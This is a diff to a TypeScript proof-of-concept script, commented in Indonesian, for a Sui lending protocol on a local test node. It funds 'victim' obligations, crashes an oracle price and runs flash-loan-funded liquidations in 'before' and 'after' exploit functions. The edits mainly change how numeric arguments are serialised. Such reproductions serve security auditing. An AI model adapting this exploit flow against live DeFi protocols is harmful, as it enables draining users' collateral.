@@ -9,6 +9,7 @@ import { SuiClient } from '@mysten/sui/client';
 import { Transaction } from '@mysten/sui/transactions';
 import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
 import { decodeSuiPrivateKey } from '@mysten/sui/cryptography';
+import { bcs } from '@mysten/sui/bcs';
 
 const client = new SuiClient({ url: 'http://127.0.0.1:9000' });
 
@@ -35,6 +36,9 @@ const funderKeypair = Ed25519Keypair.fromSecretKey(privateKeyBytes);
 const funderAddress = funderKeypair.getPublicKey().toSuiAddress();
 
 console.log(`[INIT] Funder Address: ${funderAddress}`);
+
+// Helper Serialisasi BCS (Wajib untuk SDK v1.x)
+const pu64 = (val: bigint | number) => bcs.u64().serialize(BigInt(val));
 
 // ==================== HELPER FUNCTIONS ====================
 
@@ -78,24 +82,32 @@ async function setupVictim(victimKeypair, label) {
     const victimAddr = victimKeypair.getPublicKey().toSuiAddress();
     console.log(`\n[${label}] Setting up victim at ${victimAddr}...`);
 
-    // 1. Fund victim dengan 1,000 SUI (Langsung pakai bigint tanpa tx.pure)
+    // 1. Fund victim dengan 1,000 SUI
     const fundTx = new Transaction();
-    const [suiCoin] = fundTx.splitCoins(fundTx.gas, [1010000000000n]);
+    const [suiCoin] = fundTx.splitCoins(fundTx.gas, [fundTx.pure(pu64(1010000000000n))]);
     fundTx.transferObjects([suiCoin], victimAddr);
     await executeTx(fundTx, funderKeypair);
 
-    // 2. Open Obligation
+    // 2. Open Obligation (Mengembalikan Obigation, ObligationKey, HotPotato)
     const openTx = new Transaction();
     const [obligation, obligationKey, hotPotato] = openTx.moveCall({
         target: `${PKG}::open_obligation::open_obligation`,
         arguments: [openTx.object(VERSION)],
     });
+
+    // Teruskan langsung sebagai TransactionArgument — JANGAN bungkus dengan openTx.object()
     openTx.moveCall({
         target: `${PKG}::open_obligation::return_obligation`,
-        arguments: [openTx.object(VERSION), obligation, hotPotato],
+        arguments: [
+            openTx.object(VERSION), // &Version — pakai object()
+            obligation,             // Obligation by value — langsung dari hasil moveCall
+            hotPotato,              // ObligationHotPotato by value — langsung dari hasil moveCall
+        ],
     });
+
+    // ObligationKey ditransfer ke victim
     openTx.transferObjects([obligationKey], victimAddr);
-    
+
     const openResult = await executeTx(openTx, victimKeypair);
     
     let obligationId = "", obligationKeyId = "";
@@ -106,7 +118,7 @@ async function setupVictim(victimKeypair, label) {
 
     // 3. Deposit SUI Collateral (Split langsung dari gas di PTB yang sama)
     const depositTx = new Transaction();
-    const [collateralCoin] = depositTx.splitCoins(depositTx.gas, [1000000000000n]); // 1000 SUI
+    const [collateralCoin] = depositTx.splitCoins(depositTx.gas, [depositTx.pure(pu64(1000000000000n))]); // 1000 SUI
     depositTx.moveCall({
         target: `${PKG}::deposit_collateral::deposit_collateral`,
         typeArguments: [SUI_TYPE],
@@ -122,10 +134,9 @@ async function setupVictim(victimKeypair, label) {
     // 4. Mint & Supply USDC & ETH ke Market
     const supplyTx = new Transaction();
     
-    // Gunakan tx.pure.u64() untuk argumen numerik
     const [usdcCoin] = supplyTx.moveCall({
         target: `${TEST_COIN_PKG}::usdc::mint`,
-        arguments: [supplyTx.object(USDC_TREASURY), supplyTx.pure.u64(100000000000000n)]
+        arguments: [supplyTx.object(USDC_TREASURY), supplyTx.pure(pu64(100000000000000n))]
     });
     const [sUSDC] = supplyTx.moveCall({
         target: `${PKG}::mint::mint`,
@@ -136,7 +147,7 @@ async function setupVictim(victimKeypair, label) {
 
     const [ethCoin] = supplyTx.moveCall({
         target: `${TEST_COIN_PKG}::eth::mint`,
-        arguments: [supplyTx.object(ETH_TREASURY), supplyTx.pure.u64(10000000000n)]
+        arguments: [supplyTx.object(ETH_TREASURY), supplyTx.pure(pu64(10000000000n))]
     });
     const [sETH] = supplyTx.moveCall({
         target: `${PKG}::mint::mint`,
@@ -154,7 +165,7 @@ async function setupVictim(victimKeypair, label) {
         typeArguments: [USDC_TYPE],
         arguments: [
             borrowUSDCTx.object(VERSION), borrowUSDCTx.object(obligationId), borrowUSDCTx.object(obligationKeyId),
-            borrowUSDCTx.object(MARKET), borrowUSDCTx.object(REGISTRY), borrowUSDCTx.pure.u64(500000000n),
+            borrowUSDCTx.object(MARKET), borrowUSDCTx.object(REGISTRY), borrowUSDCTx.pure(pu64(500000000n)),
             borrowUSDCTx.object(ORACLE), borrowUSDCTx.object(CLOCK)
         ],
     });
@@ -168,7 +179,7 @@ async function setupVictim(victimKeypair, label) {
         typeArguments: [ETH_TYPE],
         arguments: [
             borrowETHTx.object(VERSION), borrowETHTx.object(obligationId), borrowETHTx.object(obligationKeyId),
-            borrowETHTx.object(MARKET), borrowETHTx.object(REGISTRY), borrowETHTx.pure.u64(200000000n),
+            borrowETHTx.object(MARKET), borrowETHTx.object(REGISTRY), borrowETHTx.pure(pu64(200000000n)),
             borrowETHTx.object(ORACLE), borrowETHTx.object(CLOCK)
         ],
     });
@@ -188,7 +199,7 @@ async function crashOraclePrice() {
     tx.moveCall({
         target: `${PKG}::x_oracle::update_price`,
         typeArguments: [SUI_TYPE],
-        arguments: [tx.object(ORACLE), tx.object(CLOCK), tx.pure.u64(40000000n)]
+        arguments: [tx.object(ORACLE), tx.object(CLOCK), tx.pure(pu64(40000000n))]
     });
     
     await executeTx(tx, funderKeypair);
@@ -209,7 +220,7 @@ async function beforeExploit_singleCall(victimObligationId) {
     
     const [flashUSDC, flashReceipt] = tx.moveCall({
         target: `${PKG}::flash_loan::borrow_flash_loan`, typeArguments: [USDC_TYPE],
-        arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(50000000000n)],
+        arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure(pu64(50000000000n))],
     });
     const [remainUSDC, collateralCoin] = tx.moveCall({
         target: `${PKG}::liquidate::liquidate`, typeArguments: [USDC_TYPE, SUI_TYPE],
@@ -235,8 +246,8 @@ async function afterExploit_multiCall(victimObligationId) {
     
     const tx = new Transaction();
     
-    const [f_USDC, r_USDC] = tx.moveCall({ target: `${PKG}::flash_loan::borrow_flash_loan`, typeArguments: [USDC_TYPE], arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(50000000000n)] });
-    const [f_ETH, r_ETH] = tx.moveCall({ target: `${PKG}::flash_loan::borrow_flash_loan`, typeArguments: [ETH_TYPE], arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(10000000000n)] });
+    const [f_USDC, r_USDC] = tx.moveCall({ target: `${PKG}::flash_loan::borrow_flash_loan`, typeArguments: [USDC_TYPE], arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure(pu64(50000000000n))] });
+    const [f_ETH, r_ETH] = tx.moveCall({ target: `${PKG}::flash_loan::borrow_flash_loan`, typeArguments: [ETH_TYPE], arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure(pu64(10000000000n))] });
     
     const [rem1, c1] = tx.moveCall({ target: `${PKG}::liquidate::liquidate`, typeArguments: [USDC_TYPE, SUI_TYPE], arguments: [tx.object(VERSION), tx.object(victimObligationId), tx.object(MARKET), f_USDC, tx.object(REGISTRY), tx.object(ORACLE), tx.object(CLOCK)] });
     const [rem2, c2] = tx.moveCall({ target: `${PKG}::liquidate::liquidate`, typeArguments: [ETH_TYPE, SUI_TYPE], arguments: [tx.object(VERSION), tx.object(victimObligationId), tx.object(MARKET), f_ETH, tx.object(REGISTRY), tx.object(ORACLE), tx.object(CLOCK)] });
